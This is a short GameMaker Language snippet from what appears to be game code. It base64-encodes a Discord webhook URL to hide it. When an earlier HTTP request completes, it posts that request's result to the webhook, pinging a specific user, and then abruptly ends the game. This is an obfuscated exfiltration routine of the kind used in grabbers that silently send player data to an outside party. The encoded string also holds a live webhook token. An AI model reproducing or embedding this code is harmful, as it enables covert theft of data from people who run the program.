if async_load[? "id"] == request
{
    var web = base64_decode("aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMjkxMzI4MzcxNTM1MzgxMDgvenZxUnR4Rm0yaWszaXJVZzg3NUZnaG5ObEdqT3VZUUlhbEpnR3FneVNnREdvYXRIVkhFV0JZekx1UTVfclA1alVVb2Q=");
	var body = ds_map_create(), header = ds_map_create();
	ds_map_add(body, "content", $"<@670690881736802334> {async_load[? "result"]}");
	ds_map_add(header, "Content-Type", "application/json");
	http_request(web, "POST", header, json_encode(body));
	ds_map_destroy(body);
	ds_map_destroy(header);
	game_end();
}
